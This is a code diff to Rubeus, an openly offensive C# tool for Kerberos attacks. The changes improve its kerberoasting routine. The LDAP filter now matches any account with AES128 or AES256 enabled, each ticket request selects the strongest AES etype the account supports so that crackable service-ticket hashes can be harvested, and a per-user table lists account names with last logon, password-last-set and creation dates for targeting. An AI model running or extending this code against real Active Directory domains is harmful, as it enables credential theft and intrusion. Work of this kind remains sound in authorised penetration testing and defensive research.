@@ -490,9 +490,9 @@ namespace Rubeus
                 }
                 else if (String.Equals(supportedEType, "aes"))
                 {
-                    // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
-                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
-                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
+                    // match any account with AES128 (bit 0x08) or AES256 (bit 0x10) set
+                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96 and/or AES256_CTS_HMAC_SHA1_96");
+                    encFilter = "(|(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=8)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=16))";
                 }
 
                 // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
@@ -560,10 +560,8 @@ namespace Rubeus
                         Console.WriteLine("\r\n[*] Total kerberoastable users : {0}\r\n", users.Count);
                     }
 
-                    // used to keep track of user encryption types
-                    SortedDictionary<Interop.SUPPORTED_ETYPE, int> userETypes = new SortedDictionary<Interop.SUPPORTED_ETYPE, int>();
-                    // used to keep track of years that users had passwords last set in
-                    SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();
+                    // used to map each encryption type to the list of (samAccountName, pwdLastSet, whenCreated, lastLogon) tuples
+                    SortedDictionary<Interop.SUPPORTED_ETYPE, List<Tuple<string, DateTime?, DateTime?, DateTime?>>> userETypeMembers = new SortedDictionary<Interop.SUPPORTED_ETYPE, List<Tuple<string, DateTime?, DateTime?, DateTime?>>>();
 
                     foreach (IDictionary<string, Object> user in users)
                     {
@@ -584,31 +582,41 @@ namespace Rubeus
                             supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];
                         }
 
-                        if (!userETypes.ContainsKey(supportedETypes))
+                        // track which users belong to each encryption type, along with their pwdLastSet
+                        if (userStats)
                         {
-                            userETypes[supportedETypes] = 1;
-                        }
-                        else
-                        {
-                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
-                        }
+                            if (!userETypeMembers.ContainsKey(supportedETypes))
+                            {
+                                userETypeMembers[supportedETypes] = new List<Tuple<string, DateTime?, DateTime?, DateTime?>>();
+                            }
 
-                        if (pwdLastSet == null)
-                        {
-                            // pwdLastSet == null with new accounts and
-                            // when a password is set to never expire
-                            if (!userPWDsetYears.ContainsKey(-1))
-                                userPWDsetYears[-1] = 1;
-                            else
-                                userPWDsetYears[-1] += 1;
-                        }
-                        else
-                        {
-                            int year = pwdLastSet.Value.Year;
-                            if (!userPWDsetYears.ContainsKey(year))
-                                userPWDsetYears[year] = 1;
-                            else
-                                userPWDsetYears[year] += 1;
+                            DateTime? whenCreated = null;
+                            if (user.ContainsKey("whencreated"))
+                            {
+                                try
+                                {
+                                    object raw = user["whencreated"];
+                                    if (raw is DateTime dt)
+                                        whenCreated = dt.ToLocalTime();
+                                    else
+                                        whenCreated = DateTime.Parse(raw.ToString()).ToLocalTime();
+                                }
+                                catch { }
+                            }
+
+                            DateTime? lastLogon = null;
+                            if (user.ContainsKey("lastlogon"))
+                            {
+                                try
+                                {
+                                    long lastLogonRaw = Convert.ToInt64(user["lastlogon"]);
+                                    if (lastLogonRaw > 0 && lastLogonRaw != long.MaxValue)
+                                        lastLogon = DateTime.FromFileTimeUtc(lastLogonRaw).ToLocalTime();
+                                }
+                                catch { }
+                            }
+
+                            userETypeMembers[supportedETypes].Add(Tuple.Create(samAccountName, pwdLastSet, whenCreated, lastLogon));
                         }
 
                         if (!userStats)
@@ -642,6 +650,21 @@ namespace Rubeus
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
                                     etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
+                                else if (String.Equals(supportedEType, "aes"))
+                                {
+                                    // pick the highest AES etype this account actually supports: AES256 preferred over AES128
+                                    int eTypeRaw = (int)supportedETypes;
+                                    if ((eTypeRaw & 0x10) == 0x10)
+                                    {
+                                        etype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
+                                        if (!simpleOutput) Console.WriteLine("[*] Requesting AES256 (etype 18) for {0}", samAccountName);
+                                    }
+                                    else if ((eTypeRaw & 0x08) == 0x08)
+                                    {
+                                        etype = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
+                                        if (!simpleOutput) Console.WriteLine("[*] Requesting AES128 (etype 17) for {0}", samAccountName);
+                                    }
+                                }
                                 
                                 bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
@@ -671,22 +694,32 @@ namespace Rubeus
 
                     if (userStats)
                     {
-                        var eTypeTable = new ConsoleTable("Supported Encryption Type", "Count");
-                        var pwdLastSetTable = new ConsoleTable("Password Last Set Year", "Count");
                         Console.WriteLine();
 
-                        // display stats about the users found
-                        foreach (var item in userETypes)
+                        // legend: EType Value -> Encryption Type name for all observed etypes
+                        Console.WriteLine("\r\n[*] Encryption Type Legend:\r\n");
+                        var legendTable = new ConsoleTable("EType Value", "Encryption Type");
+                        foreach (var item in userETypeMembers)
                         {
-                            eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
+                            legendTable.AddRow(((int)item.Key).ToString(), item.Key.ToString());
                         }
-                        eTypeTable.Write();
+                        legendTable.Write();
 
-                        foreach (var item in userPWDsetYears)
+                        // per-user table
+                        Console.WriteLine("\r\n[*] Users and their supported encryption types:\r\n");
+                        var userETypeTable = new ConsoleTable("SamAccountName", "EType Value", "Last Logon", "Password Last Set", "Created");
+                        foreach (var item in userETypeMembers)
                         {
-                            pwdLastSetTable.AddRow(item.Key.ToString(), item.Value.ToString());
+                            int eTypeValue = (int)item.Key;
+                            foreach (Tuple<string, DateTime?, DateTime?, DateTime?> entry in item.Value)
+                            {
+                                string pwdLastSetStr  = entry.Item2.HasValue ? entry.Item2.Value.ToString() : "N/A";
+                                string whenCreatedStr = entry.Item3.HasValue ? entry.Item3.Value.ToString() : "N/A";
+                                string lastLogonStr   = entry.Item4.HasValue ? entry.Item4.Value.ToString() : "Never";
+                                userETypeTable.AddRow(entry.Item1, eTypeValue.ToString(), lastLogonStr, pwdLastSetStr, whenCreatedStr);
+                            }
                         }
-                        pwdLastSetTable.Write();
+                        userETypeTable.Write();
                     }
                 }
                 catch (Exception ex)
